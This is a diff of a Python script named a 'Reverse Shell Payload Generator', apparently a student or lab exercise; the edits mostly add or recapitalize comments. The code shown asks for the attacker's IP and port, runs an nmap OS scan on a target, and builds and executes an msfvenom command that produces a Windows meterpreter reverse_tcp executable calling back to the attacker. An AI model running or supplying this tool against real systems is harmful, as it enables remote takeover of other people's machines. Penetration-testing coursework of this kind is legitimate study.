@@ -224,7 +224,7 @@ import os
 import subprocess
 
 from colorama import Fore, Back, Style
-
+#colorama is a python module that allows us to change the color of the text. PURELY AESTHETIC
 print(Fore.RED + Back.BLACK)
 
 print("Welcome to the Reverse Shell Payload Generator")
@@ -234,7 +234,6 @@ print(Fore.WHITE)
 filename = input("Please enter the name you want for the file: ")
 
 # Here we are entering the Attack IP, Attack Port, whether or not we want to use meterpreter as well as if we want the payload to be staged or stageless.
-
 print(Fore.CYAN)
 
 attackerIP = input("Please enter your IP address: " + "\n")
@@ -245,7 +244,7 @@ stageless = input("Do you want the payload to be stageless? (y/n): " + "\n")
 # Enumerate target
 
 print(Fore.RED)
-#here we are adding the target information/runs a nmap scan to find the OS of the target.
+#Here we are adding the target information/runs a nmap scan to find the OS of the target.
 targetIP = input("Please enter the IP of the target machine: ")
 print(Fore.WHITE)
 osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
@@ -254,7 +253,8 @@ print(osInfo)
 
 os = ""
 payload = ""
-#here we are using if/elif statements to generate the payload depending on what OS was found in the nmap scan.
+#Here we are using if/elif statements to generate the payload depending on what OS was found in the nmap scan.
+#We have statements for Windows, linux and Mac. For this example we used our windows machine so the code will output a windows payload.
 if osInfo.find("windows") != -1:
     print(Fore.GREEN)
     os = "windows"
@@ -276,7 +276,7 @@ elif os == "":
     payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")
 
 
-
+#Here we are exporting the payload into the file with the name we previously created.
 print(Fore.GREEN + "[*] Exporting payload, please be patient as: " + filename)
 subprocess.Popen(payload, shell=True).wait()
 print("[*] Exported payload successfully.")
